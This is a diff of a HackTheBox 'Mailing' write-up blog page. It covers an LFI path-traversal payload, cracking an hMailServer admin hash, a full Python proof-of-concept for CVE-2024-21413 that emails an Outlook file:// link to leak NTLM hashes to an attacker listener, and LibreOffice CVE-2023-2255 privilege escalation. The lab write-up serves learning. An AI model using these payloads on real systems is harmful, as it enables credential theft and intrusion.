@@ -48,14 +48,6 @@
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
         
-  <div class="author-box">
-
-<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
-</div>
-
-</div>
-
-
 <div class="post">
   <h1 class="post-title">Mailing-Windows-Easy</h1>
   
@@ -68,217 +60,224 @@
 
 <h1 id="1-enumeration">1. Enumeration</h1>
 
-<p>First at all we started with a port recognition we can see a http server and some services used to sent and receive mails like smtp - imap -pop3</p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_1.png" alt="Untitled" /></p>
-
-<p>The web application have some instructions about sent an email but if we want break in we will need something else</p>
-
+<p>First at all we started with a port recognition we can see a http server and some services used to sent and receive mails like smtp - imap -pop3
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_1.png" alt="Untitled" />
+<br /><br />
+The web application have some instructions about sent an email but if we want break in we will need something else
+<br /><br /></p>
 <h1 id="2-user-flag">2. User flag</h1>
-
-<p>We can find there is a vulnerability, the smb service is vulnerable to man in the middle attacks, so we already have a clue about where the river goes</p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_2.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_3.png" alt="Untitled" /></p>
-
-<p>Even with this information is not enough for create an attack vector, so let’s dig into the server requests</p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_4.png" alt="Untitled" /></p>
-
-<p>Where the instructions are download we have interesting stuff, they are using php to find the file, we can check if we can perform a LFI, we can do this using:</p>
-
+<p><br /><br />
+We can find there is a vulnerability, the smb service is vulnerable to man in the middle attacks, so we already have a clue about where the river goes
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_2.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_3.png" alt="Untitled" />
+<br /><br />
+Even with this information is not enough for create an attack vector, so let’s dig into the server requests
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_4.png" alt="Untitled" />
+<br /><br />
+Where the instructions are download we have interesting stuff, they are using php to find the file, we can check if we can perform a LFI, we can do this using:
+<br /><br /></p>
 <pre><code class="language-arduino">/../../../../../Windows/System32/drivers/etc/hosts
 </code></pre>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_5.png" alt="Untitled" /></p>
-
-<p>The we searched for the config file of hmailserver on the documentation</p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_6.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_7.png" alt="Untitled" /></p>
-
-<p>Then we found an administrator password</p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_8.png" alt="Untitled" /></p>
-
-<p>Analyze the hash and find the password using hashcat</p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_9.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_10.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_11.png" alt="Untitled" /></p>
-
+<p><br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_5.png" alt="Untitled" />
+<br /><br />
+The we searched for the config file of hmailserver on the documentation
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_6.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_7.png" alt="Untitled" />
+<br /><br />
+Then we found an administrator password
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_8.png" alt="Untitled" />
+<br /><br />
+Analyze the hash and find the password using hashcat
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_9.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_10.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_11.png" alt="Untitled" />
+<br /><br /></p>
 <ul>
-  <li>
-    <p>CVE-2024-21413</p>
-
-    <p>Once we have credentials for hmailserver administrator based in the information mentioned before we can try a NTLM attack stealing the hash using another vulnerability CVE-2024-21413</p>
-
-    <p>This vulnerability has some implications like the potential leakage of local NTLM information and a possible RCE.</p>
-
-    <pre><code class="language-arduino">  import smtplib
-  from email.mime.multipart import MIMEMultipart
-  from email.mime.text import MIMEText
-  import argparse
-  import sys
+  <li>CVE-2024-21413
+<br /><br />
+  Once we have credentials for hmailserver administrator based in the information mentioned before we can try a NTLM attack stealing the hash using another vulnerability CVE-2024-21413
+<br /><br />
+  This vulnerability has some implications like the potential leakage of local NTLM information and a possible RCE.
+<br /><br />
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">import</span> <span class="nn">smtplib</span>
+  <span class="kn">from</span> <span class="nn">email.mime.multipart</span> <span class="kn">import</span> <span class="n">MIMEMultipart</span>
+  <span class="kn">from</span> <span class="nn">email.mime.text</span> <span class="kn">import</span> <span class="n">MIMEText</span>
+  <span class="kn">import</span> <span class="nn">argparse</span>
+  <span class="kn">import</span> <span class="nn">sys</span>
     
-  BLUE = "\033[94m"
-  GREEN = "\033[92m"
-  RED = "\033[91m"
-  ENDC = "\033[0m"
+  <span class="n">BLUE</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[94m"</span>
+  <span class="n">GREEN</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[92m"</span>
+  <span class="n">RED</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[91m"</span>
+  <span class="n">ENDC</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0m"</span>
     
-  def display_banner():
-      banner = f"""
-  {BLUE}CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
-  Alexander Hagenah / @xaitax / ah@primepage.de{ENDC}
-  """
-      print(banner)
+  <span class="k">def</span> <span class="nf">display_banner</span><span class="p">():</span>
+      <span class="n">banner</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""
+  </span><span class="si">{</span><span class="n">BLUE</span><span class="si">}</span><span class="s">CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
+  Alexander Hagenah / @xaitax / ah@primepage.de</span><span class="si">{</span><span class="n">ENDC</span><span class="si">}</span><span class="s">
+  """</span>
+      <span class="k">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
     
-  def send_email(smtp_server, port, username, password, sender_email, recipient_email, link_url, subject):
+  <span class="k">def</span> <span class="nf">send_email</span><span class="p">(</span><span class="n">smtp_server</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">sender_email</span><span class="p">,</span> <span class="n">recipient_email</span><span class="p">,</span> <span class="n">link_url</span><span class="p">,</span> <span class="n">subject</span><span class="p">):</span>
     
-      """Sends an email with both plain text and HTML parts, including advanced features."""
-      msg = MIMEMultipart('alternative')
-      msg['Subject'] = subject
-      msg['From'] = sender_email
-      msg['To'] = recipient_email
+      <span class="s">"""Sends an email with both plain text and HTML parts, including advanced features."""</span>
+      <span class="n">msg</span> <span class="o">=</span> <span class="n">MIMEMultipart</span><span class="p">(</span><span class="s">'alternative'</span><span class="p">)</span>
+      <span class="n">msg</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="n">subject</span>
+      <span class="n">msg</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="n">sender_email</span>
+      <span class="n">msg</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="n">recipient_email</span>
     
-      text = "Please read this email in HTML format."
+      <span class="n">text</span> <span class="o">=</span> <span class="s">"Please read this email in HTML format."</span>
         
-      html = f"""\
-      &lt;html&gt;
+      <span class="n">html</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""</span><span class="se">\
+</span><span class="s">      &lt;html&gt;
       &lt;body&gt;
-          &lt;h1&gt;&lt;a href="file:///{link_url}!poc"&gt;CVE-2024-21413 PoC.&lt;/a&gt;&lt;/h1&gt;
+          &lt;h1&gt;&lt;a href="file:///</span><span class="si">{</span><span class="n">link_url</span><span class="si">}</span><span class="s">!poc"&gt;CVE-2024-21413 PoC.&lt;/a&gt;&lt;/h1&gt;
       &lt;/body&gt;
       &lt;/html&gt;
-      """
+      """</span>
     
-      part1 = MIMEText(text, 'plain')
-      part2 = MIMEText(html, 'html')
-      msg.attach(part1)
-      msg.attach(part2)
+      <span class="n">part1</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="s">'plain'</span><span class="p">)</span>
+      <span class="n">part2</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="s">'html'</span><span class="p">)</span>
+      <span class="n">msg</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">part1</span><span class="p">)</span>
+      <span class="n">msg</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">part2</span><span class="p">)</span>
     
-      try:
-          with smtplib.SMTP(smtp_server, port) as server:
-              server.ehlo()
-              server.starttls()
-              server.ehlo()
-              server.login(username, password)
-              server.sendmail(sender_email, recipient_email, msg.as_string())
-              print(f"{GREEN}✅ Email sent successfully.{ENDC}")
-      except Exception as e:
-          print(f"{RED}❌ Failed to send email: {e}{ENDC}")
+      <span class="k">try</span><span class="p">:</span>
+          <span class="k">with</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTP</span><span class="p">(</span><span class="n">smtp_server</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span> <span class="k">as</span> <span class="n">server</span><span class="p">:</span>
+              <span class="n">server</span><span class="p">.</span><span class="n">ehlo</span><span class="p">()</span>
+              <span class="n">server</span><span class="p">.</span><span class="n">starttls</span><span class="p">()</span>
+              <span class="n">server</span><span class="p">.</span><span class="n">ehlo</span><span class="p">()</span>
+              <span class="n">server</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+              <span class="n">server</span><span class="p">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">sender_email</span><span class="p">,</span> <span class="n">recipient_email</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">as_string</span><span class="p">())</span>
+              <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">GREEN</span><span class="si">}</span><span class="s">✅ Email sent successfully.</span><span class="si">{</span><span class="n">ENDC</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+      <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+          <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">RED</span><span class="si">}</span><span class="s">❌ Failed to send email: </span><span class="si">{</span><span class="n">e</span><span class="si">}{</span><span class="n">ENDC</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
     
-  def main():
-      display_banner()
-      parser = argparse.ArgumentParser(description="PoC for CVE-2024-21413 with SMTP authentication.")
-      parser.add_argument('--server', required=True, help="SMTP server hostname or IP")
-      parser.add_argument('--port', type=int, default=587, help="SMTP server port")
-      parser.add_argument('--username', required=True, help="SMTP server username for authentication")
-      parser.add_argument('--password', required=True, help="SMTP server password for authentication")
-      parser.add_argument('--sender', required=True, help="Sender email address")
-      parser.add_argument('--recipient', required=True, help="Recipient email address")
-      parser.add_argument('--url', required=True, help="Malicious path to include in the email")
-      parser.add_argument('--subject', required=True, help="Email subject")
+  <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+      <span class="n">display_banner</span><span class="p">()</span>
+      <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">"PoC for CVE-2024-21413 with SMTP authentication."</span><span class="p">)</span>
+      <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--server'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"SMTP server hostname or IP"</span><span class="p">)</span>
+      <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--port'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">587</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"SMTP server port"</span><span class="p">)</span>
+      <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--username'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"SMTP server username for authentication"</span><span class="p">)</span>
+      <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--password'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"SMTP server password for authentication"</span><span class="p">)</span>
+      <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--sender'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Sender email address"</span><span class="p">)</span>
+      <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--recipient'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Recipient email address"</span><span class="p">)</span>
+      <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--url'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Malicious path to include in the email"</span><span class="p">)</span>
+      <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--subject'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Email subject"</span><span class="p">)</span>
     
-      args = parser.parse_args()
+      <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
     
-      send_email(args.server, args.port, args.username, args.password, args.sender, args.recipient, args.url, args.subject)
+      <span class="n">send_email</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">server</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">username</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">password</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">recipient</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">subject</span><span class="p">)</span>
     
-  if __name__ == "__main__":
-      if len(sys.argv) == 1:
-          display_banner()
-          sys.exit(1)
-      main()
+  <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+      <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+          <span class="n">display_banner</span><span class="p">()</span>
+          <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+      <span class="n">main</span><span class="p">()</span>
+</code></pre></div>    </div>
+    <p><br /><br />
+  This POC create a malicious hyperlink where once the victim click on the link the hash is send to attacker machine.
+<br /><br />
+  <img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_12.png" alt="Untitled" />
+<br /><br />
+  This exclamation mark is what bypass protected outlook view
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_13.png" alt="Untitled" />
+<br /><br />
+The email is sent to Maya which is one of the one presented on the web application
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_14.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_15.png" alt="Untitled" />
+<br /><br />
+The hash is pretty hard to get because we have to be patients waiting for the information. We use responder for start listening on some ports including NTLM port
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_16.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_17.png" alt="Untitled" />
+<br /><br /></p>
+    <h1 id="3priv-esc">3.Priv esc</h1>
+    <p><br /><br />
+When we got the user flag we can review two python scripts where there is a bot managing mailing we can list programmed tasks on the system using 
+<br /><br /></p>
+    <pre><code class="language-arduino">schtasks /query /fo LIST /v
 </code></pre>
-
-    <p>This POC create a malicious hyperlink where once the victim click on the link the hash is send to attacker machine.</p>
-
-    <p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_12.png" alt="Untitled" /></p>
-
-    <p>This exclamation mark is what bypass protected outlook view</p>
+    <p><br /><br />
+There we found <code class="language-plaintext highlighter-rouge">soffice.ps1</code> which is a file that executes .odt files bypassing powershell controls so we can be sure that exploiting a vulnerability on LibreOffice carries out a successful privilege escalation.
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_18.png" alt="Untitled" />
+<br /><br />
+On program files we realize there is a LibreOffice service running
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_19.png" alt="Untitled" />
+<br /><br />
+So we created a shell on python and use CVE-2023-2255 to execute it
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_20.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_21.png" alt="Untitled" />
+<br /><br />
+Once we create a shell using the malicious .odt file as it is run by local admin we got a shell as local-admin, but to make this possible we need to find a path where local admin has execute permissions 
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_22.png" alt="Untitled" />
+<br /><br />
+important documents looks to be interesting so we check using the following command
+<br /><br /></p>
+    <pre><code class="language-arduino">icacls "name of the directory"
+</code></pre>
+    <p><br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_23.png" alt="Untitled" />
+<br /><br /></p>
   </li>
+  <li>I: Objects metadata is allowed
+<br /><br /></li>
+  <li>OI: Having the possession of the object is allowed
+<br /><br /></li>
+  <li>CI: Inheriting from this object is allowed.
+<br /><br /></li>
+  <li>F: Full control
+<br /><br /></li>
+  <li>RX: Reading and executing is allowed.
+<br /><br /></li>
+  <li>M: Modifying is allowed.
+<br /><br /></li>
 </ul>
 
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_13.png" alt="Untitled" /></p>
-
-<p>The email is sent to Maya which is one of the one presented on the web application</p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_14.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_15.png" alt="Untitled" /></p>
-
-<p>The hash is pretty hard to get because we have to be patients waiting for the information. We use responder for start listening on some ports including NTLM port</p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_16.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_17.png" alt="Untitled" /></p>
-
-<h1 id="3priv-esc">3.Priv esc</h1>
-
-<p>When we got the user flag we can review two python scripts where there is a bot managing mailing we can list programmed tasks on the system using</p>
-
-<pre><code class="language-arduino">schtasks /query /fo LIST /v
-</code></pre>
-
-<p>There we found <code class="language-plaintext highlighter-rouge">soffice.ps1</code> which is a file that executes .odt files bypassing powershell controls so we can be sure that exploiting a vulnerability on LibreOffice carries out a successful privilege escalation.</p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_18.png" alt="Untitled" /></p>
-
-<p>On program files we realize there is a LibreOffice service running</p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_19.png" alt="Untitled" /></p>
-
-<p>So we created a shell on python and use CVE-2023-2255 to execute it</p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_20.png" alt="Untitled" /></p>
-
